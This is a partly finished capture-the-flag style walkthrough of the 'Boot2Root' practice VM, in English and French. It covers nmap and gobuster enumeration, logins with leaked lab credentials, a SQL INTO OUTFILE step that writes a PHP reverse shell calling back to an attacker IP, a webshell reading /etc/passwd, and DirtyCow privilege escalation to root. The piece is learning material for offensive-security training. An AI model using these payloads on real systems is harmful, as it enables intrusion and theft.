# Boot2Root

# Setup

Create a new VM from the ISO

Connect this VM as bridge adapter to be on same network as your host:


Find target's address:
    nmap -sn -PE -v IP_HOST/24

# Enumeration

## Port listing
List ports on the target with nmap

    nmap -sA -O -sV -vv -oN nmap.dump IP_TARGET/24

# Website
## Detect files and directories with gobuster

### Install gobuster

    brew install gobuster

TODO find an installation way that works at school

### Run
    gobuster dir -u http://IP_TARGET/ -w WORDLIST_PATH

find /forum
on https

## Detect files and directories with nikto

Download/install Nikto
    
    brew install nikto

## On the forum

This forum is powered by `My little forum`

We find several posts and one of them is very interesting:
 a dump of the target's connections log .
 See this >>> file <<<
TODO make a script that download the file and make a link here


users in log:
lmezard
root
admin

users in forum:
admin
lmezard
qudevide
wandre
thor
zaz



On the tab `login` we can try to connect as `lmezard` with the password `!q\]Ej?*5K5cy*AJ`.

Success !!


we find her email: `laurie@borstosec.net`

Nmap is finaly over.
Now we can detect several things
21 FTP VSFTPS 2.0.8
22 SSH OPENSSH 5.9p1
80 HTTP Apache 2.2.22
143: IMAP Dovecot imapd
    email dumped: root@born2sec.net
443 HTTP Apache 2.2.22
993 SSL/IMAP Dovecot imapd

We run the script Nikto and find:

/webmail/src/index.php

Version: `1.4.22`

we connect with 
    laurie@born2sec.net
    !q\]Ej?*5K5cy*AJ
Now we found other interesting things:
Some email including root's:
- qudevide@mail.borntosec.net
- ft_root@mail.borntosec.net

Some DB credentials:
user: root 
password: Fg-'kKXBj87E:aJ$

On the **official** website of `squirelMail` we can find that version bellow or equal to `1.4.22` are vulnerable at `arbitrary code execution` referenced as `CVE-2017-7692`.

With some research on this CVE we can easely find an exploit and test it.

On the phpmyadmin page
get a php webshell

Version: `3.4.10.1deb1`

...

Now we need to read this file.
For this purpose we need to look at a vulnerability called `locale file injection`.

We found nothing really interesting.

Sur le Readme de My little forum https://github.com/ilosuna/mylittleforum on peut lire que les permissions du repertoire `templates_c`.

Upload the shell and goto /forum/templates_c/exploit.php?e=cat /etc/passwd

reverse shell:
SELECT "<?php $sock=fsockopen(\"192.168.1.242\",8090);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>" into outfile "/var/www/forum/templates_c/nat4.php";

Set your listener:
    nc -lvnk 8081
Go to https://TARGET_IP/forum/templates_c/nat4.php
You should now have received a connection from the target.



The dirty way:

The linux core under linux 3.9 are all vulnerable to the `dirtyCow` vulnerability.

Download an exploit of the `dirtyCow` vulnerability:
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

Edit in the code the variable `username` to the user you want to reset his password.

compile it with:
    gcc -pthread dirty.c -o out -lcrypt

run it, give the new password wait a little and look at `/etc/passwd`.
You should find something like:
root:roK20XGbWEsSM

Run:
    sudo -c /bin/bash

Rentrez votre nouveau mot de passe.

TADAAM you are root now !!

Une fois root

Upgrade your shell:

Run:
- `python -c 'import pty; pty.spawn("/bin/bash")'`.

That's enought to run some command like su or sudo but if you want an even better shell add thoose commands:
- `export TERM=xterm` -- this will give us access to term commands such as clear.
- `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`.

dans /home/LOOKATME/password on trouve:
    lmezard:G!@M6f4Eatau{sF"
Connect as lmezard with 
    su lmezard

Here we have a challenge. An executable that can gives us the next password

# Pour plus tard

Checker le serveur VSFTPD
